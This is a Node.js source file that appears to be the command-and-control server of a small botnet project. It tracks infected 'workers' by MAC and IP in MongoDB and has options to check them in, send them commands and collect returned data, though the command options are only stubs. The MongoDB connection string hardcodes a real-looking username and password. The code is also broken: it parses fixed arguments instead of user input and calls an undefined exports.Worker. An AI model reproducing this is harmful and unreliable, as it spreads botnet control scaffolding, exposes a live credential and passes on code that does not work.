#!/usr/bin/env node
'use strict'

// Database connection
var mongoose = require('mongoose');
mongoose.connect('mongodb://tzhu:123asdqwezxc@cluster0-shard-00-00-p2ven.mongodb.net:27017,cluster0-shard-00-01-p2ven.mongodb.net:27017,cluster0-shard-00-02-p2ven.mongodb.net:27017/test?ssl=true&replicaSet=Cluster0-shard-0&authSource=admin');
var db = mongoose.connection;
// Input
const readline = require('readline');
const io = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});
var program = require('commander');
// Models
var Worker = require('./worker.js');
var Work = require('./work.js');

io.on('line', function(d) {
    // note:  d is an object, and when converted to a string it will
    // end with a linefeed.  so we (rather crudely) account for that
    // with toString() and then trim()
    console.log("Command entered: [" + d.toString().trim() + "]");

    console.log(process.argv);
    program
      .option('-s, --status', 'Print all worker information, including statuses')
      .option('-c, --check', 'Ask workers to check in')
      .option('-E, --execute', 'Send command to workers')
      .option('-r, --report', 'Print all data returned by workers')
    program.parse([ '/usr/local/Cellar/node/8.7.0/bin/node',
                    '/Users/tinazhu/botnet/server.js', 'server',
                    '-s', '-E' ]);
    if (program.args.length === 0) program.help();

    if(program.status) {
      console.log("Printing all worker information: ");
      Worker.find(function (err, workers) {
        if (err) return console.error(err);
        console.log(workers);
      })
    }
    if(program.check) {
      console.log("Asking for workers to check in: ");
    }
    if(program.execute) {
      console.log("Executing given command: ");
    }
    if(program.report) {
      console.log("Printing out returned data: ");
      Work.find(function (err, work) {
        if (err) return console.error(err);
        console.log(work);
      })
    }

  });

// Error message
db.on('error', console.error.bind(console, 'Connection error:'));
// New worker created
db.on('open', function() {
    var new_worker = new exports.Worker({id: 1,
                                 mac: 'NEW_MAC',
                                 ip: 'LAST_IP',
                                 status: 'NEW_STATUS'});
    new_worker.save(function(err, new_worker) {
      if(err) console.log("New worker could not be saved.");
    });
});
// Output from last
db.on('data', function() {
    var new_worker = new exports.Worker({id: 1,
                                 mac: 'NEW_MAC',
                                 ip: 'LAST_IP',
                                 status: 'NEW_STATUS'});
    new_worker.save(function(err, new_worker) {
      if(err) console.log("New worker could not be saved.");
    });
});
